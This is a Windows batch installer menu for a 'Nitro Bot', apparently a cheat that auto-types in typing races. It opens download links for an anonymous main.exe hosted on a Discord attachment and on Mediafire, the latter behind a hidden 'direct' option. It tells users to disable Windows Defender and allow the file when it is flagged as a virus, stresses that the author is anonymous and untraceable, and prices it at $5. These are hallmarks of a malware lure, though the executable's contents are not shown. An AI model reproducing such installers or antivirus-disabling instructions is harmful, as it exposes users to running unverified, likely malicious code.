@echo off
echo This is the Install Guide for Niro Bot
echo what would you like to do?
echo These are the choices
echo i = install
echo c = credits
echo v = version
echo d = defender
echo k = keybinds

:menu
set /p menuchoice=

if %menuchoice% == i goto install
if %menuchoice% == c goto credits
if %menuchoice% == v goto version
if %menuchoice% == d goto defender
if %menuchoice% == k goto keybinds
if %menuchoice% == direct goto direct
pause

:install
echo You need to install bolth "Nitro Bot" and "Power Toys"
echo Power Toys is used for a text extractor which is needed to get the text
echo once u installed power toys open it find "Text Extractor" and view the keybind if u dont like the keybind change it and when the race starts make sure to extract the bottom text and then click 5 / Type Clipboard Text then let it run after putting in the first capitol letter first to start the typing.
echo -------------------------------------------------------------------------------------------------------------------------------------
echo n = Download Nitro Bot
echo p = Download Power Toys

set /p menuchoice=

if %menuchoice% == n goto nitro
if %menuchoice% == p goto power


:credits
echo Credits are anoymouse If anyone Finds this program the coder is anoymous dont try to find you will have no proof This is to be distrubuted for 5$ THis is the original build and its completely secret.
 pause

:version
echo v1.0.0
echo - First version
pause

:defender
echo Windows defender will say its a virus and its not its just a bot you need to disable defender and click "allow on device" when u get the notification
pause

:direct
echo hey bro u found secret page
echo direct download can be found here "https://www.mediafire.com/file/q5sdt25hmhz155g/main.exe/file"
pause

:nitro
cd C:\Program Files (x86)\Microsoft\Edge\Application
start "msedge.exe" https://cdn.discordapp.com/attachments/1059638175401791559/1169624065162625025/main.exe?ex=6556144b&is=65439f4b&hm=029f06cfbc4a1b5cb2c82da9a7e992b25d58c2bbb80084b3225a73f75e1bcab9&
pause

:power
cd C:\Program Files (x86)\Microsoft\Edge\Application
start "msedge.exe" https://learn.microsoft.com/en-us/windows/powertoys/install#installing-with-windows-executable-file-via-github
pause

:keybinds
echo the only keybind is "5" which allows you to start the bots typing
pause